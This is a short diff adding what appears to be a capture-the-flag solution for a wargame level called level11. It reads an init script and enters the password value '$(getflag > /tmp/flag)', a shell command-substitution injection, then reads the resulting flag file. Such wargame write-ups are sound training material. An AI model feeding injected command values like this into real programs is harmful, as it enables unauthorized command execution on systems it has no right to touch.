@@ -1,0 +1,4 @@
+cat /etc/init.d/level11_start
+
+Password: $(getflag > /tmp/flag)
+cat /tmp/flag
